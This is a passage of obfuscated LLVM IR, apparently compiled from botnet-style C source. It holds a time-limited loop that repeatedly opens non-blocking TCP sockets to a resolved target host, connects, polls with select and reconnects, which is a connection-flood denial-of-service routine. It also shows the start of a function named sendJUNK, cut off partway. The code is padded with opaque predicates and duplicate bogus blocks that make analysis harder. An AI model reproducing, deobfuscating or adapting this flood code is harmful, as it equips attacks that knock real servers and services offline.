  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %50

; <label>:33:                                     ; preds = %3
  %34 = load i32, i32* @x.53
  %35 = load i32, i32* @y.54
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %33
  %42 = load i32, i32* @x.53
  %43 = load i32, i32* @y.54
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %416

; <label>:50:                                     ; preds = %3
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %52 = getelementptr inbounds [8 x i8], [8 x i8]* %51, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %52, i8 0, i64 8, i32 4, i1 false)
  %53 = load i32, i32* %7, align 4
  %54 = zext i32 %53 to i64
  %55 = call i8* @llvm.stacksave()
  store i8* %55, i8** %10, align 8
  %56 = alloca %struct.state_t, i64 %54, align 16
  %57 = bitcast %struct.state_t* %56 to i8*
  %58 = load i32, i32* %7, align 4
  %59 = sext i32 %58 to i64
  %60 = mul i64 %59, 5
  call void @llvm.memset.p0i8.i64(i8* %57, i8 0, i64 %60, i32 16, i1 false)
  %61 = call noalias i8* @malloc(i64 1024) #2
  store i8* %61, i8** %16, align 8
  %62 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %62, i8 0, i64 1024, i32 1, i1 false)
  %63 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %64 = load i32, i32* %6, align 4
  %65 = add nsw i32 %63, %64
  store i32 %65, i32* %17, align 4
  br label %66

; <label>:66:                                     ; preds = %413, %50
  %67 = load i32, i32* @x.53
  %68 = load i32, i32* @y.54
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %66
  %75 = load i32, i32* %17, align 4
  %76 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %77 = icmp sgt i32 %75, %76
  %78 = load i32, i32* @x.53
  %79 = load i32, i32* @y.54
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %77, label %86, label %414

; <label>:86:                                     ; preds = %originalBBpart24
  store i32 0, i32* %8, align 4
  br label %87

; <label>:87:                                     ; preds = %410, %86
  %88 = load i32, i32* %8, align 4
  %89 = load i32, i32* %7, align 4
  %90 = icmp slt i32 %88, %89
  br i1 %90, label %91, label %413

; <label>:91:                                     ; preds = %87
  %92 = load i32, i32* %8, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %93
  %95 = getelementptr inbounds %struct.state_t, %struct.state_t* %94, i32 0, i32 1
  %96 = load i8, i8* %95, align 4
  %97 = zext i8 %96 to i32
  switch i32 %97, label %393 [
    i32 0, label %98
    i32 1, label %190
    i32 2, label %307
  ]

; <label>:98:                                     ; preds = %91
  %99 = load i32, i32* @x.53
  %100 = load i32, i32* @y.54
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %98
  %107 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %108 = load i32, i32* %8, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %109
  %111 = getelementptr inbounds %struct.state_t, %struct.state_t* %110, i32 0, i32 0
  store i32 %107, i32* %111, align 8
  %112 = load i32, i32* %8, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %113
  %115 = getelementptr inbounds %struct.state_t, %struct.state_t* %114, i32 0, i32 0
  %116 = load i32, i32* %115, align 8
  %117 = load i32, i32* %8, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %118
  %120 = getelementptr inbounds %struct.state_t, %struct.state_t* %119, i32 0, i32 0
  %121 = load i32, i32* %120, align 8
  %122 = call i32 (i32, i32, ...) @fcntl(i32 %121, i32 3, i8* null)
  %123 = or i32 %122, 2048
  %124 = call i32 (i32, i32, ...) @fcntl(i32 %116, i32 4, i32 %123)
  %125 = load i32, i32* %8, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %126
  %128 = getelementptr inbounds %struct.state_t, %struct.state_t* %127, i32 0, i32 0
  %129 = load i32, i32* %128, align 8
  %130 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %131 = call i32 @connect(i32 %129, %struct.sockaddr* %130, i32 16)
  %132 = icmp ne i32 %131, -1
  %133 = load i32, i32* @x.53
  %134 = load i32, i32* @y.54
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %132, label %145, label %141

; <label>:141:                                    ; preds = %originalBBpart28
  %142 = call i32* @__errno_location() #13
  %143 = load i32, i32* %142, align 4
  %144 = icmp ne i32 %143, 115
  br i1 %144, label %145, label %168

; <label>:145:                                    ; preds = %141, %originalBBpart28
  %146 = load i32, i32* @x.53
  %147 = load i32, i32* @y.54
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %145
  %154 = load i32, i32* %8, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %155
  %157 = getelementptr inbounds %struct.state_t, %struct.state_t* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 8
  %159 = call i32 @close(i32 %158)
  %160 = load i32, i32* @x.53
  %161 = load i32, i32* @y.54
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %173

; <label>:168:                                    ; preds = %141
  %169 = load i32, i32* %8, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %170
  %172 = getelementptr inbounds %struct.state_t, %struct.state_t* %171, i32 0, i32 1
  store i8 1, i8* %172, align 4
  br label %173

; <label>:173:                                    ; preds = %168, %originalBBpart212
  %174 = load i32, i32* @x.53
  %175 = load i32, i32* @y.54
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %173
  %182 = load i32, i32* @x.53
  %183 = load i32, i32* @y.54
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %393

; <label>:190:                                    ; preds = %91
  br label %191

; <label>:191:                                    ; preds = %190
  %192 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %193 = getelementptr inbounds [16 x i64], [16 x i64]* %192, i64 0, i64 0
  %194 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %193) #2, !srcloc !4
  %195 = extractvalue { i64, i64* } %194, 0
  %196 = extractvalue { i64, i64* } %194, 1
  %197 = trunc i64 %195 to i32
  store i32 %197, i32* %18, align 4
  %198 = ptrtoint i64* %196 to i64
  %199 = trunc i64 %198 to i32
  store i32 %199, i32* %19, align 4
  br label %200

; <label>:200:                                    ; preds = %191
  br label %201

; <label>:201:                                    ; preds = %200
  %202 = load i32, i32* %8, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %203
  %205 = getelementptr inbounds %struct.state_t, %struct.state_t* %204, i32 0, i32 0
  %206 = load i32, i32* %205, align 8
  %207 = srem i32 %206, 64
  %208 = zext i32 %207 to i64
  %209 = shl i64 1, %208
  %210 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %211 = load i32, i32* %8, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %212
  %214 = getelementptr inbounds %struct.state_t, %struct.state_t* %213, i32 0, i32 0
  %215 = load i32, i32* %214, align 8
  %216 = sdiv i32 %215, 64
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds [16 x i64], [16 x i64]* %210, i64 0, i64 %217
  %219 = load i64, i64* %218, align 8
  %220 = or i64 %219, %209
  store i64 %220, i64* %218, align 8
  %221 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %221, align 8
  %222 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %222, align 8
  %223 = load i32, i32* %8, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %224
  %226 = getelementptr inbounds %struct.state_t, %struct.state_t* %225, i32 0, i32 0
  %227 = load i32, i32* %226, align 8
  %228 = add nsw i32 %227, 1
  %229 = call i32 @select(i32 %228, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %229, i32* %15, align 4
  %230 = load i32, i32* %15, align 4
  %231 = icmp eq i32 %230, 1
  br i1 %231, label %232, label %275

; <label>:232:                                    ; preds = %201
  store i32 4, i32* %13, align 4
  %233 = load i32, i32* %8, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %234
  %236 = getelementptr inbounds %struct.state_t, %struct.state_t* %235, i32 0, i32 0
  %237 = load i32, i32* %236, align 8
  %238 = bitcast i32* %14 to i8*
  %239 = call i32 @getsockopt(i32 %237, i32 1, i32 4, i8* %238, i32* %13) #2
  %240 = load i32, i32* %14, align 4
  %241 = icmp ne i32 %240, 0
  br i1 %241, label %242, label %253

; <label>:242:                                    ; preds = %232
  %243 = load i32, i32* %8, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %244
  %246 = getelementptr inbounds %struct.state_t, %struct.state_t* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = call i32 @close(i32 %247)
  %249 = load i32, i32* %8, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %250
  %252 = getelementptr inbounds %struct.state_t, %struct.state_t* %251, i32 0, i32 1
  store i8 0, i8* %252, align 4
  br label %258

; <label>:253:                                    ; preds = %232
  %254 = load i32, i32* %8, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %255
  %257 = getelementptr inbounds %struct.state_t, %struct.state_t* %256, i32 0, i32 1
  store i8 2, i8* %257, align 4
  br label %258

; <label>:258:                                    ; preds = %253, %242
  %259 = load i32, i32* @x.53
  %260 = load i32, i32* @y.54
  %261 = sub i32 %259, 1
  %262 = mul i32 %259, %261
  %263 = urem i32 %262, 2
  %264 = icmp eq i32 %263, 0
  %265 = icmp slt i32 %260, 10
  %266 = or i1 %264, %265
  br i1 %266, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %258
  %267 = load i32, i32* @x.53
  %268 = load i32, i32* @y.54
  %269 = sub i32 %267, 1
  %270 = mul i32 %267, %269
  %271 = urem i32 %270, 2
  %272 = icmp eq i32 %271, 0
  %273 = icmp slt i32 %268, 10
  %274 = or i1 %272, %273
  br i1 %274, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %306

; <label>:275:                                    ; preds = %201
  %276 = load i32, i32* %15, align 4
  %277 = icmp eq i32 %276, -1
  br i1 %277, label %278, label %289

; <label>:278:                                    ; preds = %275
  %279 = load i32, i32* %8, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %280
  %282 = getelementptr inbounds %struct.state_t, %struct.state_t* %281, i32 0, i32 0
  %283 = load i32, i32* %282, align 8
  %284 = call i32 @close(i32 %283)
  %285 = load i32, i32* %8, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %286
  %288 = getelementptr inbounds %struct.state_t, %struct.state_t* %287, i32 0, i32 1
  store i8 0, i8* %288, align 4
  br label %289

; <label>:289:                                    ; preds = %278, %275
  %290 = load i32, i32* @x.53
  %291 = load i32, i32* @y.54
  %292 = sub i32 %290, 1
  %293 = mul i32 %290, %292
  %294 = urem i32 %293, 2
  %295 = icmp eq i32 %294, 0
  %296 = icmp slt i32 %291, 10
  %297 = or i1 %295, %296
  br i1 %297, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %289
  %298 = load i32, i32* @x.53
  %299 = load i32, i32* @y.54
  %300 = sub i32 %298, 1
  %301 = mul i32 %298, %300
  %302 = urem i32 %301, 2
  %303 = icmp eq i32 %302, 0
  %304 = icmp slt i32 %299, 10
  %305 = or i1 %303, %304
  br i1 %305, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %306

; <label>:306:                                    ; preds = %originalBBpart224, %originalBBpart220
  br label %393

; <label>:307:                                    ; preds = %91
  %308 = load i32, i32* @x.53
  %309 = load i32, i32* @y.54
  %310 = sub i32 %308, 1
  %311 = mul i32 %308, %310
  %312 = urem i32 %311, 2
  %313 = icmp eq i32 %312, 0
  %314 = icmp slt i32 %309, 10
  %315 = or i1 %313, %314
  br i1 %315, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %307
  %316 = load i32, i32* @x.53
  %317 = load i32, i32* @y.54
  %318 = sub i32 %316, 1
  %319 = mul i32 %316, %318
  %320 = urem i32 %319, 2
  %321 = icmp eq i32 %320, 0
  %322 = icmp slt i32 %317, 10
  %323 = or i1 %321, %322
  br i1 %323, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %324

; <label>:324:                                    ; preds = %originalBBpart228
  %325 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %326 = getelementptr inbounds [16 x i64], [16 x i64]* %325, i64 0, i64 0
  %327 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %326) #2, !srcloc !5
  %328 = extractvalue { i64, i64* } %327, 0
  %329 = extractvalue { i64, i64* } %327, 1
  %330 = trunc i64 %328 to i32
  store i32 %330, i32* %20, align 4
  %331 = ptrtoint i64* %329 to i64
  %332 = trunc i64 %331 to i32
  store i32 %332, i32* %21, align 4
  br label %333

; <label>:333:                                    ; preds = %324
  br label %334

; <label>:334:                                    ; preds = %333
  %335 = load i32, i32* @x.53
  %336 = load i32, i32* @y.54
  %337 = sub i32 %335, 1
  %338 = mul i32 %335, %337
  %339 = urem i32 %338, 2
  %340 = icmp eq i32 %339, 0
  %341 = icmp slt i32 %336, 10
  %342 = or i1 %340, %341
  br i1 %342, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %334
  %343 = load i32, i32* %8, align 4
  %344 = sext i32 %343 to i64
  %345 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %344
  %346 = getelementptr inbounds %struct.state_t, %struct.state_t* %345, i32 0, i32 0
  %347 = load i32, i32* %346, align 8
  %348 = srem i32 %347, 64
  %349 = zext i32 %348 to i64
  %350 = shl i64 1, %349
  %351 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %352 = load i32, i32* %8, align 4
  %353 = sext i32 %352 to i64
  %354 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %353
  %355 = getelementptr inbounds %struct.state_t, %struct.state_t* %354, i32 0, i32 0
  %356 = load i32, i32* %355, align 8
  %357 = sdiv i32 %356, 64
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds [16 x i64], [16 x i64]* %351, i64 0, i64 %358
  %360 = load i64, i64* %359, align 8
  %361 = or i64 %360, %350
  store i64 %361, i64* %359, align 8
  %362 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %362, align 8
  %363 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %363, align 8
  %364 = load i32, i32* %8, align 4
  %365 = sext i32 %364 to i64
  %366 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %365
  %367 = getelementptr inbounds %struct.state_t, %struct.state_t* %366, i32 0, i32 0
  %368 = load i32, i32* %367, align 8
  %369 = add nsw i32 %368, 1
  %370 = call i32 @select(i32 %369, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %370, i32* %15, align 4
  %371 = load i32, i32* %15, align 4
  %372 = icmp ne i32 %371, 0
  %373 = load i32, i32* @x.53
  %374 = load i32, i32* @y.54
  %375 = sub i32 %373, 1
  %376 = mul i32 %373, %375
  %377 = urem i32 %376, 2
  %378 = icmp eq i32 %377, 0
  %379 = icmp slt i32 %374, 10
  %380 = or i1 %378, %379
  br i1 %380, label %originalBBpart262, label %originalBB30alteredBB

originalBBpart262:                                ; preds = %originalBB30
  br i1 %372, label %381, label %392

; <label>:381:                                    ; preds = %originalBBpart262
  %382 = load i32, i32* %8, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %383
  %385 = getelementptr inbounds %struct.state_t, %struct.state_t* %384, i32 0, i32 0
  %386 = load i32, i32* %385, align 8
  %387 = call i32 @close(i32 %386)
  %388 = load i32, i32* %8, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %389
  %391 = getelementptr inbounds %struct.state_t, %struct.state_t* %390, i32 0, i32 1
  store i8 0, i8* %391, align 4
  br label %392

; <label>:392:                                    ; preds = %381, %originalBBpart262
  br label %393

; <label>:393:                                    ; preds = %392, %306, %originalBBpart216, %91
  %394 = load i32, i32* @x.53
  %395 = load i32, i32* @y.54
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %393
  %402 = load i32, i32* @x.53
  %403 = load i32, i32* @y.54
  %404 = sub i32 %402, 1
  %405 = mul i32 %402, %404
  %406 = urem i32 %405, 2
  %407 = icmp eq i32 %406, 0
  %408 = icmp slt i32 %403, 10
  %409 = or i1 %407, %408
  br i1 %409, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br label %410

; <label>:410:                                    ; preds = %originalBBpart266
  %411 = load i32, i32* %8, align 4
  %412 = add nsw i32 %411, 1
  store i32 %412, i32* %8, align 4
  br label %87

; <label>:413:                                    ; preds = %87
  br label %66

; <label>:414:                                    ; preds = %originalBBpart24
  %415 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %415)
  br label %416

; <label>:416:                                    ; preds = %414, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %33
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %66
  %417 = load i32, i32* %17, align 4
  %418 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %419 = icmp sgt i32 %417, %418
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %98
  %420 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %421 = load i32, i32* %8, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %422
  %424 = getelementptr inbounds %struct.state_t, %struct.state_t* %423, i32 0, i32 0
  store i32 %420, i32* %424, align 8
  %425 = load i32, i32* %8, align 4
  %426 = sext i32 %425 to i64
  %427 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %426
  %428 = getelementptr inbounds %struct.state_t, %struct.state_t* %427, i32 0, i32 0
  %429 = load i32, i32* %428, align 8
  %430 = load i32, i32* %8, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %431
  %433 = getelementptr inbounds %struct.state_t, %struct.state_t* %432, i32 0, i32 0
  %434 = load i32, i32* %433, align 8
  %435 = call i32 (i32, i32, ...) @fcntl(i32 %434, i32 3, i8* null)
  %_ = sub i32 0, %435
  %gen = add i32 %_, 2048
  %436 = or i32 %435, 2048
  %437 = call i32 (i32, i32, ...) @fcntl(i32 %429, i32 4, i32 %436)
  %438 = load i32, i32* %8, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %439
  %441 = getelementptr inbounds %struct.state_t, %struct.state_t* %440, i32 0, i32 0
  %442 = load i32, i32* %441, align 8
  %443 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %444 = call i32 @connect(i32 %442, %struct.sockaddr* %443, i32 16)
  %445 = icmp ne i32 %444, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %145
  %446 = load i32, i32* %8, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %447
  %449 = getelementptr inbounds %struct.state_t, %struct.state_t* %448, i32 0, i32 0
  %450 = load i32, i32* %449, align 8
  %451 = call i32 @close(i32 %450)
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %173
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %258
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %289
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %307
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %334
  %452 = load i32, i32* %8, align 4
  %453 = sext i32 %452 to i64
  %454 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %453
  %455 = getelementptr inbounds %struct.state_t, %struct.state_t* %454, i32 0, i32 0
  %456 = load i32, i32* %455, align 8
  %_31 = shl i32 %456, 64
  %_32 = sub i32 %456, 64
  %gen33 = mul i32 %_32, 64
  %_34 = shl i32 %456, 64
  %_35 = sub i32 0, %456
  %gen36 = add i32 %_35, 64
  %_37 = shl i32 %456, 64
  %_38 = sub i32 %456, 64
  %gen39 = mul i32 %_38, 64
  %_40 = sub i32 %456, 64
  %gen41 = mul i32 %_40, 64
  %457 = srem i32 %456, 64
  %458 = zext i32 %457 to i64
  %_42 = sub i64 1, %458
  %gen43 = mul i64 %_42, %458
  %_44 = sub i64 0, 1
  %gen45 = add i64 %_44, %458
  %_46 = sub i64 1, %458
  %gen47 = mul i64 %_46, %458
  %_48 = shl i64 1, %458
  %_49 = sub i64 1, %458
  %gen50 = mul i64 %_49, %458
  %459 = shl i64 1, %458
  %460 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %461 = load i32, i32* %8, align 4
  %462 = sext i32 %461 to i64
  %463 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %462
  %464 = getelementptr inbounds %struct.state_t, %struct.state_t* %463, i32 0, i32 0
  %465 = load i32, i32* %464, align 8
  %_51 = sub i32 %465, 64
  %gen52 = mul i32 %_51, 64
  %_53 = sub i32 %465, 64
  %gen54 = mul i32 %_53, 64
  %_55 = shl i32 %465, 64
  %466 = sdiv i32 %465, 64
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds [16 x i64], [16 x i64]* %460, i64 0, i64 %467
  %469 = load i64, i64* %468, align 8
  %_56 = sub i64 %469, %459
  %gen57 = mul i64 %_56, %459
  %470 = or i64 %469, %459
  store i64 %470, i64* %468, align 8
  %471 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %471, align 8
  %472 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %472, align 8
  %473 = load i32, i32* %8, align 4
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds %struct.state_t, %struct.state_t* %56, i64 %474
  %476 = getelementptr inbounds %struct.state_t, %struct.state_t* %475, i32 0, i32 0
  %477 = load i32, i32* %476, align 8
  %_58 = shl i32 %477, 1
  %_59 = sub i32 0, %477
  %gen60 = add i32 %_59, 1
  %478 = add nsw i32 %477, 1
  %479 = call i32 @select(i32 %478, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %479, i32* %15, align 4
  %480 = load i32, i32* %15, align 4
  %481 = icmp ne i32 %480, 0
  br label %originalBB30

originalBB64alteredBB:                            ; preds = %originalBB64, %393
  br label %originalBB64
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare i32 @time(...) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.55
  %5 = load i32, i32* @y.56
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i8*, align 8
  %19 = alloca %struct.__sigset_t, align 8
  %20 = alloca %struct.timeval, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  %28 = call i32 @getdtablesize() #2
  %29 = sdiv i32 %28, 2
  store i32 %29, i32* %15, align 4
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = load i32, i32* %13, align 4
  %32 = trunc i32 %31 to i16
  %33 = call zeroext i16 @htons(i16 zeroext %32) #13
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  %35 = load i8*, i8** %12, align 8
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %37 = call i32 @getHost(i8* %35, %struct.in_addr* %36)
  %38 = icmp ne i32 %37, 0
  %39 = load i32, i32* @x.55
  %40 = load i32, i32* @y.56
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %38, label %47, label %48

; <label>:47:                                     ; preds = %originalBBpart2
  br label %386

